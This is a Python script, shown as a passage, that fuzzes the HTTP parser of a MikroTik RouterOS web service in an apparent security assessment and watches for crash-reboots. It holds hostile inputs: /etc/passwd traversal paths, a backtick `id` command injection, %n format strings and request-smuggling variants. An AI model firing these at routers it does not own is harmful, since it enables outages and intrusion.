#!/usr/bin/env python3
"""
attack_www_headers.py - HTTP Header/Request Line Overflow Testing
MikroTik RouterOS CHR 7.20.8 — www binary HTTP header/request line parsing assessment
Target: [REDACTED-INTERNAL-IP] ([REDACTED-CREDS])

Tests (150 total):
  1. Oversized Individual Headers (48 tests)
     - Host, User-Agent, Content-Type, Authorization, Cookie, X-Forwarded-For
     - Sizes: 256, 512, 1024, 2048, 4096, 8192, 16384, 65536 bytes

  2. Large Number of Headers (5 tests)
     - 10, 50, 100, 500, 1000 headers in a single request

  3. Malformed Header Format (10 tests)
     - Missing colon, null bytes in name/value, CRLF injection
     - Headers with no value, very long header name

  4. HTTP Request Line Overflow (12 tests)
     - Long URL paths (256 to 65536), long HTTP version, long method
     - Spaces in URL, null in URL

  5. Chunked Transfer Encoding (5 tests)
     - Oversized chunk size hex, negative chunk, zero-length, integer overflow

  6. Content-Length Mismatches (6 tests)
     - Larger than body, negative, MAX_INT, zero with body, missing with body,
       duplicate Content-Length

  7. Additional Edge Cases (64 tests)
     - Request smuggling primitives (CL+TE conflict, TE obfuscation variants)
     - Header line folding (obs-fold), HTTP/0.9/2.0/3.0 versions
     - Malformed request lines (LF-only, CR-only, tabs, backticks)
     - Host header attacks (empty, duplicate, port overflow, userinfo, IPv6)
     - Oversized auth headers (Basic, Bearer, Digest, NTLM)
     - Path traversal sequences, format strings in body
     - Oversized query strings, 128KB header, pipelined requests
     - Unusual HTTP methods (OPTIONS, TRACE, CONNECT, WebDAV)
     - Binary/non-ASCII header values, incomplete/zero-length requests
     - 1000-cookie stress test

Evidence: evidence/attack_www_headers.json
"""

import json
import os
import socket
import sys
import time
import warnings
from datetime import datetime
from pathlib import Path

import requests

# Suppress SSL and urllib3 warnings
warnings.filterwarnings("ignore")
requests.packages.urllib3.disable_warnings()

# ── Configuration ───────────────────────────────────────────────────────────

TARGET = "[REDACTED-INTERNAL-IP]"
PORT = 80
AUTH = ("admin", "admin")
ADMIN_USER = "admin"
ADMIN_PASS = "admin"
SOCKET_TIMEOUT = 5
PAUSE_BETWEEN_TESTS = 0.5
CRASH_WAIT_MAX = 60
CRASH_WAIT_INTERVAL = 5

EVIDENCE_DIR = Path("/home/[REDACTED]/Desktop/[REDACTED-PATH]/MikroTik/evidence")
EVIDENCE_FILE = EVIDENCE_DIR / "attack_www_headers.json"


# ── Logging ─────────────────────────────────────────────────────────────────

def log(msg):
    print(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}", flush=True)


# ── Health Check & Crash Detection ──────────────────────────────────────────

def get_uptime():
    """Get router uptime string via REST API. Returns (alive, uptime_str)."""
    try:
        r = requests.get(
            f"http://{TARGET}/rest/system/resource",
            auth=AUTH, timeout=SOCKET_TIMEOUT, verify=False)
        if r.status_code == 200:
            data = r.json()
            return True, data.get("uptime", "unknown")
        return True, None  # reachable but unexpected status
    except Exception:
        pass
    # Fallback: TCP connect on port 80
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(SOCKET_TIMEOUT)
        s.connect((TARGET, PORT))
        s.close()
        return True, None
    except Exception:
        return False, None


def check_health():
    """Full health check returning dict with alive, uptime, version, etc."""
    try:
        r = requests.get(
            f"http://{TARGET}/rest/system/resource",
            auth=AUTH, timeout=SOCKET_TIMEOUT, verify=False)
        if r.status_code == 200:
            data = r.json()
            return {
                "alive": True,
                "uptime": data.get("uptime"),
                "cpu_load": data.get("cpu-load"),
                "free_memory": data.get("free-memory"),
                "version": data.get("version"),
            }
        return {"alive": True, "status_code": r.status_code}
    except Exception:
        pass
    return {"alive": False}


def wait_for_router():
    """Wait up to CRASH_WAIT_MAX seconds for the router to come back."""
    log(f"Router appears down. Waiting up to {CRASH_WAIT_MAX}s for recovery...")
    start = time.time()
    while time.time() - start < CRASH_WAIT_MAX:
        alive, uptime = get_uptime()
        if alive:
            log(f"  Router is back online (uptime={uptime})")
            return True, uptime
        time.sleep(CRASH_WAIT_INTERVAL)
    log(f"  Router did not recover within {CRASH_WAIT_MAX}s!")
    return False, None


def detect_crash(uptime_before, uptime_after):
    """Compare uptime strings to detect a reboot. Returns True if crash detected."""
    if uptime_before is None or uptime_after is None:
        return False
    # Parse uptime durations for comparison. MikroTik format examples:
    #   "1d2h3m4s", "5h30m10s", "2m15s", "45s"
    # If the uptime_after is shorter than uptime_before, a reboot occurred.
    def parse_uptime(s):
        """Parse MikroTik uptime string to total seconds."""
        total = 0
        import re
        weeks = re.search(r'(\d+)w', s)
        days = re.search(r'(\d+)d', s)
        hours = re.search(r'(\d+)h', s)
        mins = re.search(r'(\d+)m', s)
        secs = re.search(r'(\d+)s', s)
        if weeks:
            total += int(weeks.group(1)) * 7 * 86400
        if days:
            total += int(days.group(1)) * 86400
        if hours:
            total += int(hours.group(1)) * 3600
        if mins:
            total += int(mins.group(1)) * 60
        if secs:
            total += int(secs.group(1))
        return total

    try:
        before_sec = parse_uptime(uptime_before)
        after_sec = parse_uptime(uptime_after)
        # If uptime went backwards (or is drastically smaller), a reboot happened
        if after_sec < before_sec - 5:  # 5s tolerance for timing jitter
            return True
    except Exception:
        pass
    return False


# ── Raw Socket HTTP Sender ──────────────────────────────────────────────────

def send_raw_http(raw_bytes, timeout=SOCKET_TIMEOUT):
    """Send raw bytes to TARGET:PORT and return (response_bytes, error_str).
    Returns up to 8KB of response data."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((TARGET, PORT))
        s.sendall(raw_bytes)
        response = b""
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                response += chunk
                if len(response) > 8192:
                    break
        except socket.timeout:
            pass
        except Exception:
            pass
        s.close()
        return response, None
    except Exception as e:
        return None, str(e)


def truncate_for_evidence(data, max_len=500):
    """Truncate bytes or string for JSON evidence storage."""
    if data is None:
        return None
    if isinstance(data, bytes):
        try:
            text = data.decode("utf-8", errors="replace")
        except Exception:
            text = repr(data)
    else:
        text = str(data)
    if len(text) > max_len:
        return text[:max_len] + f"... [truncated, total {len(text)} chars]"
    return text


# ── Evidence Collector ──────────────────────────────────────────────────────

class EvidenceCollector:
    """Inline evidence collector matching the project pattern."""

    def __init__(self, script_name, phase):
        self.results = {
            "metadata": {
                "script": script_name,
                "target": TARGET,
                "phase": phase,
                "start_time": datetime.now().isoformat(),
                "end_time": None,
                "total_tests": 0,
                "anomalies": 0,
                "crashes_detected": 0,
                "router_version": None,
            },
            "tests": [],
            "findings": [],
            "crash_events": [],
        }

        # Record initial router state
        health = check_health()
        if health.get("alive"):
            self.results["metadata"]["router_version"] = health.get("version")
            self.results["metadata"]["initial_uptime"] = health.get("uptime")

    def add_test(self, category, name, description, result, details=None, anomaly=False):
        """Record a test result."""
        test = {
            "id": self.results["metadata"]["total_tests"] + 1,
            "category": category,
            "name": name,
            "description": description,
            "result": result,
            "anomaly": anomaly,
            "timestamp": datetime.now().isoformat(),
        }
        if details:
            test["details"] = details
        self.results["tests"].append(test)
        self.results["metadata"]["total_tests"] += 1
        if anomaly:
            self.results["metadata"]["anomalies"] += 1
        status_icon = "ANOMALY" if anomaly else "OK"
        log(f"  [{status_icon}] #{test['id']} {name}: {result}")

    def add_finding(self, severity, title, description, evidence_refs=None,
                    cwe=None, cvss=None, reproduction_steps=None):
        """Record a potential security finding."""
        finding = {
            "id": len(self.results["findings"]) + 1,
            "severity": severity,
            "title": title,
            "description": description,
            "timestamp": datetime.now().isoformat(),
        }
        if evidence_refs:
            finding["evidence_refs"] = evidence_refs
        if cwe:
            finding["cwe"] = cwe
        if cvss:
            finding["cvss_estimate"] = cvss
        if reproduction_steps:
            finding["reproduction_steps"] = reproduction_steps
        self.results["findings"].append(finding)
        log(f"  FINDING [{severity}]: {title}")

    def add_crash_event(self, test_name, uptime_before, uptime_after):
        """Record a crash/reboot event."""
        event = {
            "test_name": test_name,
            "uptime_before": uptime_before,
            "uptime_after": uptime_after,
            "timestamp": datetime.now().isoformat(),
        }
        self.results["crash_events"].append(event)
        self.results["metadata"]["crashes_detected"] += 1
        log(f"  CRASH DETECTED during '{test_name}' "
            f"(uptime {uptime_before} -> {uptime_after})")

    def save(self, filepath):
        """Save evidence JSON."""
        self.results["metadata"]["end_time"] = datetime.now().isoformat()

        # Final health check
        final_health = check_health()
        self.results["metadata"]["final_health"] = final_health

        with open(filepath, "w") as f:
            json.dump(self.results, f, indent=2, default=str)
        log(f"Evidence saved to {filepath}")

    def summary(self):
        """Print summary."""
        m = self.results["metadata"]
        f_count = len(self.results["findings"])
        c_count = m["crashes_detected"]
        log("=" * 60)
        log(f"SUMMARY: {m['total_tests']} tests, {m['anomalies']} anomalies, "
            f"{f_count} findings, {c_count} crashes")
        log("=" * 60)
        if self.results["findings"]:
            log("Findings:")
            for f in self.results["findings"]:
                log(f"  [{f['severity']}] {f['title']}")
        if self.results["crash_events"]:
            log("Crash Events:")
            for ce in self.results["crash_events"]:
                log(f"  {ce['test_name']}: uptime {ce['uptime_before']} -> {ce['uptime_after']}")


# ── Test Runner Helper ──────────────────────────────────────────────────────

def run_test(ec, category, name, description, raw_payload):
    """Execute a single raw-socket HTTP test with health checks.

    Steps:
    1. Health check before (get uptime)
    2. Send raw payload
    3. Health check after (get uptime, compare)
    4. Record evidence

    Returns True if router crashed/rebooted.
    """
    # Pre-test health check
    alive_before, uptime_before = get_uptime()
    if not alive_before:
        log(f"  Router down before test '{name}', waiting for recovery...")
        recovered, uptime_before = wait_for_router()
        if not recovered:
            ec.add_test(category, name, description,
                        "SKIPPED - router unresponsive",
                        anomaly=True)
            return True

    # Send the payload
    response, error = send_raw_http(raw_payload)

    # Brief pause to let any crash propagate
    time.sleep(0.3)

    # Post-test health check
    alive_after, uptime_after = get_uptime()
    crashed = False

    if not alive_after:
        # Router went down
        recovered, uptime_after = wait_for_router()
        crashed = True
        ec.add_crash_event(name, uptime_before, uptime_after)
    elif uptime_before and uptime_after and detect_crash(uptime_before, uptime_after):
        crashed = True
        ec.add_crash_event(name, uptime_before, uptime_after)

    # Build result string
    if crashed:
        result_str = f"CRASH DETECTED (uptime {uptime_before} -> {uptime_after})"
    elif error:
        result_str = f"Connection error: {error}"
    elif response is not None:
        # Parse HTTP status from response
        try:
            status_line = response.split(b"\r\n", 1)[0].decode("utf-8", errors="replace")
        except Exception:
            status_line = "unparseable"
        result_str = f"Response: {status_line} ({len(response)} bytes)"
    else:
        result_str = "No response received"

    # Determine anomaly
    is_anomaly = crashed or (error is not None and "Connection refused" not in str(error))

    details = {
        "payload_size": len(raw_payload),
        "payload_preview": truncate_for_evidence(raw_payload, 300),
        "response_preview": truncate_for_evidence(response, 500),
        "error": error,
        "uptime_before": uptime_before,
        "uptime_after": uptime_after,
        "crashed": crashed,
    }

    ec.add_test(category, name, description, result_str, details=details,
                anomaly=is_anomaly)

    if crashed:
        ec.add_finding(
            "CRITICAL",
            f"Router crash/reboot triggered by: {name}",
            f"Sending {description} caused the router to crash or reboot. "
            f"Uptime changed from {uptime_before} to {uptime_after}. "
            f"Payload size: {len(raw_payload)} bytes.",
            cwe="CWE-120",
            reproduction_steps=[
                f"1. Send raw HTTP payload to {TARGET}:{PORT}",
                f"2. Payload: {truncate_for_evidence(raw_payload, 200)}",
                "3. Observe router reboot via uptime comparison",
            ]
        )

    # Pause between tests
    time.sleep(PAUSE_BETWEEN_TESTS)

    return crashed


# =============================================================================
# Section 1: Oversized Individual Headers (~48 tests)
# =============================================================================

def test_oversized_headers(ec):
    """Test oversized individual HTTP headers."""
    log("=" * 60)
    log("Section 1: Oversized Individual Headers")
    log("=" * 60)
    category = "oversized_headers"

    header_names = ["Host", "User-Agent", "Content-Type",
                    "Authorization", "Cookie", "X-Forwarded-For"]
    sizes = [256, 512, 1024, 2048, 4096, 8192, 16384, 65536]

    for hdr_name in header_names:
        for size in sizes:
            value = "A" * size
            name = f"{hdr_name} {size}B"
            description = f"Send {hdr_name} header with {size}-byte value"

            # Build raw HTTP request
            raw = (
                f"GET / HTTP/1.1\r\n"
                f"Host: {TARGET}\r\n"
                f"{hdr_name}: {value}\r\n"
                f"Connection: close\r\n"
                f"\r\n"
            ).encode("utf-8")

            run_test(ec, category, name, description, raw)


# =============================================================================
# Section 2: Large Number of Headers (~5 tests)
# =============================================================================

def test_many_headers(ec):
    """Test requests with many HTTP headers."""
    log("=" * 60)
    log("Section 2: Large Number of Headers")
    log("=" * 60)
    category = "many_headers"

    header_counts = [10, 50, 100, 500, 1000]

    for count in header_counts:
        name = f"{count} headers"
        description = f"Send HTTP request with {count} custom headers"

        lines = [
            f"GET / HTTP/1.1",
            f"Host: {TARGET}",
        ]
        for i in range(count):
            lines.append(f"X-Custom-{i}: value-{i}")
        lines.append("Connection: close")
        lines.append("")
        lines.append("")

        raw = "\r\n".join(lines).encode("utf-8")
        run_test(ec, category, name, description, raw)


# =============================================================================
# Section 3: Malformed Header Format (~10 tests)
# =============================================================================

def test_malformed_headers(ec):
    """Test malformed HTTP header formats."""
    log("=" * 60)
    log("Section 3: Malformed Header Format")
    log("=" * 60)
    category = "malformed_headers"

    test_cases = [
        (
            "Missing colon in header",
            "Send header line without colon separator",
            f"GET / HTTP/1.1\r\nHost: {TARGET}\r\nBadHeaderNoColon\r\nConnection: close\r\n\r\n"
        ),
        (
            "Null byte in header name",
            "Send header with null byte embedded in name",
            f"GET / HTTP/1.1\r\nHost: {TARGET}\r\nX-Null\x00Name: value\r\nConnection: close\r\n\r\n"
        ),
        (
            "Null byte in header value",
            "Send header with null byte embedded in value",
            f"GET / HTTP/1.1\r\nHost: {TARGET}\r\nX-Test: val\x00ue\r\nConnection: close\r\n\r\n"
        ),
        (
            "CRLF injection in header value",
            "Inject CRLF sequence inside header value to split headers",
            f"GET / HTTP/1.1\r\nHost: {TARGET}\r\nX-Inject: value\r\nInjected-Header: evil\r\nConnection: close\r\n\r\n"
        ),
        (
            "Header with empty value",
            "Send header with name but no value after colon",
            f"GET / HTTP/1.1\r\nHost: {TARGET}\r\nX-Empty:\r\nConnection: close\r\n\r\n"
        ),
        (
            "Header with only colon",
            "Send header line that is just a colon",
            f"GET / HTTP/1.1\r\nHost: {TARGET}\r\n:\r\nConnection: close\r\n\r\n"
        ),
        (
            "Very long header name (4096B)",
            "Send header with a 4096-byte name",
            f"GET / HTTP/1.1\r\nHost: {TARGET}\r\n{'X' * 4096}: value\r\nConnection: close\r\n\r\n"
        ),
        (
            "Very long header name (16384B)",
            "Send header with a 16384-byte name",
            f"GET / HTTP/1.1\r\nHost: {TARGET}\r\n{'X' * 16384}: value\r\nConnection: close\r\n\r\n"
        ),
        (
            "Tab in header name",
            "Send header with tab character in name",
            f"GET / HTTP/1.1\r\nHost: {TARGET}\r\nX-Tab\tName: value\r\nConnection: close\r\n\r\n"
        ),
        (
            "Header with only spaces",
            "Send header line consisting of spaces and colon",
            f"GET / HTTP/1.1\r\nHost: {TARGET}\r\n     :     \r\nConnection: close\r\n\r\n"
        ),
    ]

    for name, description, raw_str in test_cases:
        raw = raw_str.encode("utf-8")
        run_test(ec, category, name, description, raw)


# =============================================================================
# Section 4: HTTP Request Line Overflow (~10 tests)
# =============================================================================

def test_request_line_overflow(ec):
    """Test HTTP request line parsing with oversized/malformed components."""
    log("=" * 60)
    log("Section 4: HTTP Request Line Overflow")
    log("=" * 60)
    category = "request_line"

    # 4.1 Long URL paths
    url_sizes = [256, 512, 1024, 2048, 4096, 8192, 16384, 65536]
    for size in url_sizes:
        path = "/" + "A" * (size - 1)
        name = f"Long URL path ({size}B)"
        description = f"Send GET request with {size}-byte URL path"
        raw = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {TARGET}\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        ).encode("utf-8")
        run_test(ec, category, name, description, raw)

    # 4.2 Long HTTP version string
    long_version = "HTTP/" + "1" * 4096
    name = "Long HTTP version string (4KB)"
    description = "Send request with oversized HTTP version field"
    raw = (
        f"GET / {long_version}\r\n"
        f"Host: {TARGET}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode("utf-8")
    run_test(ec, category, name, description, raw)

    # 4.3 Long method name
    long_method = "X" * 4096
    name = "Long method name (4KB)"
    description = "Send request with 4096-byte HTTP method"
    raw = (
        f"{long_method} / HTTP/1.1\r\n"
        f"Host: {TARGET}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode("utf-8")
    run_test(ec, category, name, description, raw)

    # 4.4 Spaces embedded in URL
    name = "Spaces in URL path"
    description = "Send GET with spaces embedded in URL (no encoding)"
    raw = (
        f"GET /path with spaces/file HTTP/1.1\r\n"
        f"Host: {TARGET}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode("utf-8")
    run_test(ec, category, name, description, raw)

    # 4.5 Null byte in URL
    name = "Null byte in URL path"
    description = "Send GET with null byte embedded in URL path"
    raw = (
        f"GET /path\x00/traversal HTTP/1.1\r\n"
        f"Host: {TARGET}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode("utf-8")
    run_test(ec, category, name, description, raw)


# =============================================================================
# Section 5: Chunked Transfer Encoding (~5 tests)
# =============================================================================

def test_chunked_encoding(ec):
    """Test chunked transfer encoding edge cases."""
    log("=" * 60)
    log("Section 5: Chunked Transfer Encoding")
    log("=" * 60)
    category = "chunked_encoding"

    # 5.1 Oversized chunk size hex value
    name = "Oversized chunk size hex (FFFFF)"
    description = "Send chunked request with very large chunk size declaration"
    body = "A" * 10
    raw = (
        f"POST / HTTP/1.1\r\n"
        f"Host: {TARGET}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Connection: close\r\n"
        f"\r\n"
        f"FFFFF\r\n"
        f"{body}\r\n"
        f"0\r\n"
        f"\r\n"
    ).encode("utf-8")
    run_test(ec, category, name, description, raw)

    # 5.2 Negative chunk size
    name = "Negative chunk size (-1)"
    description = "Send chunked request with negative chunk size"
    raw = (
        f"POST / HTTP/1.1\r\n"
        f"Host: {TARGET}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Connection: close\r\n"
        f"\r\n"
        f"-1\r\n"
        f"data\r\n"
        f"0\r\n"
        f"\r\n"
    ).encode("utf-8")
    run_test(ec, category, name, description, raw)

    # 5.3 Zero-length chunks (many)
    name = "Multiple zero-length chunks"
    description = "Send chunked request with 50 zero-length chunks"
    chunks = "0\r\n\r\n" * 50
    raw = (
        f"POST / HTTP/1.1\r\n"
        f"Host: {TARGET}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Connection: close\r\n"
        f"\r\n"
        f"{chunks}"
    ).encode("utf-8")
    run_test(ec, category, name, description, raw)

    # 5.4 Chunk size integer overflow (FFFFFFFF)
    name = "Chunk size integer overflow (FFFFFFFF)"
    description = "Send chunked request with 0xFFFFFFFF chunk size (4GB)"
    raw = (
        f"POST / HTTP/1.1\r\n"
        f"Host: {TARGET}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Connection: close\r\n"
        f"\r\n"
        f"FFFFFFFF\r\n"
        f"small data\r\n"
        f"0\r\n"
        f"\r\n"
    ).encode("utf-8")
    run_test(ec, category, name, description, raw)

    # 5.5 Chunk size with extension and semicolons
    name = "Chunk extension with long value"
    description = "Send chunk size line with oversized extension parameter"
    ext = "x" * 4096
    raw = (
        f"POST / HTTP/1.1\r\n"
        f"Host: {TARGET}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Connection: close\r\n"
        f"\r\n"
        f"5;ext={ext}\r\n"
        f"hello\r\n"
        f"0\r\n"
        f"\r\n"
    ).encode("utf-8")
    run_test(ec, category, name, description, raw)


# =============================================================================
# Section 6: Content-Length Mismatches (~6 tests)
# =============================================================================

def test_content_length(ec):
    """Test Content-Length header edge cases and mismatches."""
    log("=" * 60)
    log("Section 6: Content-Length Mismatches")
    log("=" * 60)
    category = "content_length"

    # 6.1 Content-Length larger than actual body
    name = "Content-Length larger than body"
    description = "Send Content-Length: 10000 with only 10 bytes of body"
    raw = (
        f"POST / HTTP/1.1\r\n"
        f"Host: {TARGET}\r\n"
        f"Content-Length: 10000\r\n"
        f"Connection: close\r\n"
        f"\r\n"
        f"short body"
    ).encode("utf-8")
    run_test(ec, category, name, description, raw)

    # 6.2 Negative Content-Length
    name = "Negative Content-Length (-1)"
    description = "Send Content-Length: -1 with a small body"
    raw = (
        f"POST / HTTP/1.1\r\n"
        f"Host: {TARGET}\r\n"
        f"Content-Length: -1\r\n"
        f"Connection: close\r\n"
        f"\r\n"
        f"body data"
    ).encode("utf-8")
    run_test(ec, category, name, description, raw)

    # 6.3 Content-Length MAX_INT (2147483647)
    name = "Content-Length MAX_INT (2147483647)"
    description = "Send Content-Length set to 2^31-1 with small body"
    raw = (
        f"POST / HTTP/1.1\r\n"
        f"Host: {TARGET}\r\n"
        f"Content-Length: 2147483647\r\n"
        f"Connection: close\r\n"
        f"\r\n"
        f"tiny"
    ).encode("utf-8")
    run_test(ec, category, name, description, raw)

    # 6.4 Content-Length zero with body present
    name = "Content-Length: 0 with body"
    description = "Send Content-Length: 0 but include a body payload"
    raw = (
        f"POST / HTTP/1.1\r\n"
        f"Host: {TARGET}\r\n"
        f"Content-Length: 0\r\n"
        f"Connection: close\r\n"
        f"\r\n"
        f"This body should be ignored but may not be"
    ).encode("utf-8")
    run_test(ec, category, name, description, raw)

    # 6.5 Missing Content-Length with body (no Transfer-Encoding)
    name = "No Content-Length, body present"
    description = "Send POST with body but no Content-Length or Transfer-Encoding"
    raw = (
        f"POST / HTTP/1.1\r\n"
        f"Host: {TARGET}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
        f"body without length indication"
    ).encode("utf-8")
    run_test(ec, category, name, description, raw)

    # 6.6 Duplicate Content-Length headers (request smuggling primitive)
    name = "Duplicate Content-Length headers"
    description = "Send two Content-Length headers with different values"
    raw = (
        f"POST / HTTP/1.1\r\n"
        f"Host: {TARGET}\r\n"
        f"Content-Length: 5\r\n"
        f"Content-Length: 100\r\n"
        f"Connection: close\r\n"
        f"\r\n"
        f"hello"
    ).encode("utf-8")
    run_test(ec, category, name, description, raw)


# =============================================================================
# Section 7: Additional Edge Cases (~66 tests to reach ~150 total)
# =============================================================================

def test_additional_edge_cases(ec):
    """Additional edge case tests for header/request line parsing."""
    log("=" * 60)
    log("Section 7: Additional Edge Cases")
    log("=" * 60)
    category = "edge_cases"

    # 7.1 HTTP Request Smuggling primitives

    # CL + TE conflict
    name = "CL+TE conflict (smuggling)"
    description = "Send both Content-Length and Transfer-Encoding headers"
    raw = (
        f"POST / HTTP/1.1\r\n"
        f"Host: {TARGET}\r\n"
        f"Content-Length: 5\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Connection: close\r\n"
        f"\r\n"
        f"0\r\n"
        f"\r\n"
    ).encode("utf-8")
    run_test(ec, category, name, description, raw)

    # TE obfuscation variants
    te_variants = [
        ("Transfer-Encoding: chunked", "TE standard"),
        ("Transfer-Encoding:  chunked", "TE extra space"),
        ("Transfer-Encoding: Chunked", "TE capitalized"),
        ("Transfer-Encoding: CHUNKED", "TE uppercase"),
        ("Transfer-Encoding : chunked", "TE space before colon"),
        ("Transfer-Encoding: chunked\r\nTransfer-Encoding: identity", "TE double"),
        ("Transfer-Encoding:\tchunked", "TE tab separator"),
        ("Transfer-encoding: chunked", "TE lowercase name"),
        ("TrAnSfEr-EnCoDiNg: chunked", "TE mixed case name"),
    ]

    for te_header, variant_name in te_variants:
        name = f"TE obfuscation: {variant_name}"
        description = f"Test Transfer-Encoding header variant: {variant_name}"
        raw = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {TARGET}\r\n"
            f"{te_header}\r\n"
            f"Connection: close\r\n"
            f"\r\n"
            f"5\r\n"
            f"hello\r\n"
            f"0\r\n"
            f"\r\n"
        ).encode("utf-8")
        run_test(ec, category, name, description, raw)

    # 7.2 Header continuation (obs-fold / line folding)
    name = "Header line folding (obs-fold)"
    description = "Use obsolete HTTP header line folding with leading whitespace"
    raw = (
        f"GET / HTTP/1.1\r\n"
        f"Host: {TARGET}\r\n"
        f"X-Folded: first-part\r\n"
        f" second-part\r\n"
        f"\tcontinued-with-tab\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode("utf-8")
    run_test(ec, category, name, description, raw)

    # 7.3 HTTP/0.9 request (no headers)
    name = "HTTP/0.9 request"
    description = "Send HTTP/0.9 style request (just method and path, no version)"
    raw = b"GET /\r\n"
    run_test(ec, category, name, description, raw)

    # 7.4 HTTP/2.0 up[REDACTED] attempt
    name = "HTTP/2.0 version"
    description = "Send request with HTTP/2.0 version string"
    raw = (
        f"GET / HTTP/2.0\r\n"
        f"Host: {TARGET}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode("utf-8")
    run_test(ec, category, name, description, raw)

    # 7.5 HTTP/3.0 version
    name = "HTTP/3.0 version"
    description = "Send request with HTTP/3.0 version string"
    raw = (
        f"GET / HTTP/3.0\r\n"
        f"Host: {TARGET}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode("utf-8")
    run_test(ec, category, name, description, raw)

    # 7.6 Various malformed request lines
    malformed_lines = [
        ("No space before HTTP version", f"GET /HTTP/1.1\r\nHost: {TARGET}\r\n\r\n"),
        ("Double space before path", f"GET  / HTTP/1.1\r\nHost: {TARGET}\r\n\r\n"),
        ("Trailing space in request line", f"GET / HTTP/1.1 \r\nHost: {TARGET}\r\n\r\n"),
        ("LF only line endings", f"GET / HTTP/1.1\nHost: {TARGET}\n\n"),
        ("CR only line endings", f"GET / HTTP/1.1\rHost: {TARGET}\r\r"),
        ("Mixed CRLF and LF", f"GET / HTTP/1.1\r\nHost: {TARGET}\nConnection: close\r\n\r\n"),
        ("Empty request line", f"\r\nGET / HTTP/1.1\r\nHost: {TARGET}\r\n\r\n"),
        ("Multiple empty lines before request", f"\r\n\r\n\r\nGET / HTTP/1.1\r\nHost: {TARGET}\r\n\r\n"),
        ("Tab instead of space in request", f"GET\t/\tHTTP/1.1\r\nHost: {TARGET}\r\n\r\n"),
        ("Backtick in path", f"GET /`id` HTTP/1.1\r\nHost: {TARGET}\r\n\r\n"),
    ]

    for name, raw_str in malformed_lines:
        description = f"Malformed request line: {name}"
        raw = raw_str.encode("utf-8")
        run_test(ec, category, name, description, raw)

    # 7.7 Host header attacks
    host_attacks = [
        ("Empty Host", f"GET / HTTP/1.1\r\nHost:\r\nConnection: close\r\n\r\n"),
        ("Duplicate Host headers", f"GET / HTTP/1.1\r\nHost: {TARGET}\r\nHost: evil.com\r\nConnection: close\r\n\r\n"),
        ("Host with port overflow", f"GET / HTTP/1.1\r\nHost: {TARGET}:99999999\r\nConnection: close\r\n\r\n"),
        ("Host with @ (userinfo)", f"GET / HTTP/1.1\r\nHost: admin@{TARGET}\r\nConnection: close\r\n\r\n"),
        ("Host with IPv6 brackets", f"GET / HTTP/1.1\r\nHost: [::1]\r\nConnection: close\r\n\r\n"),
        ("Host missing", f"GET / HTTP/1.1\r\nConnection: close\r\n\r\n"),
    ]

    for name, raw_str in host_attacks:
        description = f"Host header attack: {name}"
        raw = raw_str.encode("utf-8")
        run_test(ec, category, name, description, raw)

    # 7.8 Oversized Authorization header with various schemes
    auth_schemes = [
        ("Basic", "Basic " + "A" * 8192),
        ("Bearer", "Bearer " + "A" * 8192),
        ("Digest", "Digest username=\"" + "A" * 8192 + "\""),
        ("NTLM", "NTLM " + "A" * 8192),
    ]

    for scheme_name, value in auth_schemes:
        name = f"Oversized {scheme_name} auth (8KB)"
        description = f"Send oversized {scheme_name} Authorization header"
        raw = (
            f"GET / HTTP/1.1\r\n"
            f"Host: {TARGET}\r\n"
            f"Authorization: {value}\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        ).encode("utf-8")
        run_test(ec, category, name, description, raw)

    # 7.9 URL with path traversal sequences
    traversal_paths = [
        ("Basic traversal", "/../../../etc/passwd"),
        ("Double-encoded traversal", "/%252e%252e/%252e%252e/etc/passwd"),
        ("Backslash traversal", "/..\\..\\..\\etc\\passwd"),
        ("URL-encoded dots", "/%2e%2e/%2e%2e/%2e%2e/etc/passwd"),
        ("Mixed traversal", "/..%2f..%2f..%2fetc%2fpasswd"),
        ("Long traversal (100 dirs)", "/" + ("../" * 100) + "etc/passwd"),
    ]

    for name, path in traversal_paths:
        description = f"Path traversal in URL: {name}"
        raw = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {TARGET}\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        ).encode("utf-8")
        run_test(ec, category, name, description, raw)

    # 7.10 Request body with format string patterns
    fmt_strings = [
        ("%s" * 500, "500x %s"),
        ("%n" * 500, "500x %n (write)"),
        ("%x" * 500, "500x %x (hex dump)"),
        ("%p" * 500, "500x %p (pointer)"),
    ]

    for payload, name_suffix in fmt_strings:
        name = f"Format string in POST body: {name_suffix}"
        description = f"Send format string specifiers in POST body"
        body = payload
        raw = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {TARGET}\r\n"
            f"Content-Length: {len(body)}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Connection: close\r\n"
            f"\r\n"
            f"{body}"
        ).encode("utf-8")
        run_test(ec, category, name, description, raw)

    # 7.11 Oversized query string
    for qs_size in [1024, 4096, 16384, 65536]:
        name = f"Oversized query string ({qs_size}B)"
        description = f"Send GET with {qs_size}-byte query string"
        qs = "a=" + "B" * (qs_size - 2)
        raw = (
            f"GET /?{qs} HTTP/1.1\r\n"
            f"Host: {TARGET}\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        ).encode("utf-8")
        run_test(ec, category, name, description, raw)

    # 7.12 Extremely long single-line header (128KB combined)
    name = "Single header 128KB"
    description = "Send single header with 131072-byte value"
    raw = (
        f"GET / HTTP/1.1\r\n"
